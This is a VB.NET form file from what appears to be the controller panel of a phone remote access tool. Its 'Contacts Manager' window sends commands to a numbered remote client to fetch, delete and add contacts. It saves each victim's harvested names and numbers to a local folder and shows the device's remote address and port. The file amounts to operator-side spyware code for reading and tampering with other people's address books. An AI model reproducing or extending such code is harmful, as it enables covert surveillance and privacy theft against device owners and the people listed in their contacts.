﻿Public Class Contacts_Manager
    Dim imageList_0 As New ImageList()
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String

    Sub Client_data(ByVal data As String)
        Try
            If data IsNot Nothing Then


                If data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]") Then
                    Dim spl_Exception() As String = {"[My/Exception]"}
                    Dim p() As String = data.Split(spl_Exception, StringSplitOptions.RemoveEmptyEntries)


                    Label1.Text = p(0)
                    If Panel3.Visible = False Then Panel3.Visible = True
                Else



                    DataGridView1.Rows.Clear()
                    Dim spl_LN() As String = {Form1.s.split_Line}
                    Dim ln() As String = data.Split(spl_LN, StringSplitOptions.RemoveEmptyEntries)
                    Dim Save_data As System.Text.StringBuilder = New System.Text.StringBuilder()
                    For i As Integer = 0 To ln.Length - 1
                        Dim split_Ary() As String = {Form1.s.split_Ary}
                        Dim Ary() As String = ln(i).Split(split_Ary, StringSplitOptions.RemoveEmptyEntries)
                        Dim index_image As Integer = 0



                        index_image = imageList_0.Images.IndexOfKey(Ary(2).ToUpper)
                        Select Case index_image
                            Case -1
                                Dim sim$ = Ary(2).ToUpper
                                If sim.Contains("sim".ToUpper) Then
                                    index_image = imageList_0.Images.IndexOfKey("sim".ToUpper)
                                Else
                                    index_image = imageList_0.Images.IndexOfKey("phone".ToUpper)
                                End If
                        End Select





                        DataGridView1.Rows.Add(imageList_0.Images(index_image), Ary(0), Ary(1), Ary(2))
                        Save_data.AppendFormat("{0}", Ary(0) + " , " + Ary(1) + " , " + Ary(2) + vbNewLine)


                    Next
                    store_0.Save_0(Name_Client & Client_ID & "\" & "Contacts_Manager", Save_data.ToString)
                    refres_title()
                    If Panel3.Visible = True Then Panel3.Visible = False

                End If




            End If
        Catch ex As Exception

            'MsgBox(ex.ToString)
        End Try
    End Sub

    Private Sub refres_title()
        Dim title As String = String.Format("Contacts Manager" + " - Remote Address & Port: {0} Client Name: {1} - Item: {2} Item Selection: {3}", Client_remote_Address, Name_Client, CStr(DataGridView1.Rows.Count), CStr(DataGridView1.SelectedRows.Count))
        Text = title
    End Sub
    Private Sub Contacts_Manager_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        RefreshToolStripMenuItem.Image = store_0.Bitmap_0("ctx_refresh")
        DeleteToolStripMenuItem.Image = store_0.Bitmap_0("ctx_delete")

        AddContactToolStripMenuItem.Image = store_0.Bitmap_0("ctx_add")

        ContextMenuStrip1.Renderer = New Theme_0
#Region " imageList Contacts "
        Dim b As Boolean = False
        Dim List_Files As String() = IO.Directory.GetFiles(Application.StartupPath & "\" & store_0.name_folder_app_resource & "\icons\contacts_manager\")
        Dim i As String
        For Each i In List_Files
            If b = False Then
                Me.icon_0.Width = Bitmap.FromFile(i).Size.Width
                imageList_0.ImageSize = New Size(Bitmap.FromFile(i).Size.Width, Bitmap.FromFile(i).Size.Height)
                imageList_0.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit
                b = True
            End If
            Dim FilePath As String = i
            Dim directoryPath As String = IO.Path.GetFileNameWithoutExtension(FilePath)
            imageList_0.Images.Add(directoryPath.ToUpper, Bitmap.FromFile(i))
        Next
#End Region

        refres_title()
        Me.Icon = store_0.icons_0("window")
    End Sub
    Private Sub DataGridView1_SelectionChanged(sender As Object, e As EventArgs) Handles DataGridView1.SelectionChanged
        refres_title()
    End Sub
    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        Form1.s.Send(handle_Number_Client, "contacts_manager")
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Form1.s.Send(handle_Number_Client, "contacts_manager_delete" + Form1.s.SplitData + DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value)
                DataGridView1.Rows.RemoveAt(DataGridView1.SelectedRows(i).Index)
            Next
        End If
    End Sub

    Private Sub AddContactToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddContactToolStripMenuItem.Click



        Dim a As New Add_Contacts

        'a.Button1.DialogResult = DialogResult.OK
        a.ShowDialog()
        If a.DialogResult = DialogResult.OK Then
            Dim resultName As String = a.TextBox1.Text
            Dim resultNumber As String = a.TextBox2.Text


            Form1.s.Send(handle_Number_Client, "contacts_manager_write" + Form1.s.SplitData + resultName + Form1.s.SplitData + resultNumber)

        End If
        a.Dispose()
        a.Close()







    End Sub
End Class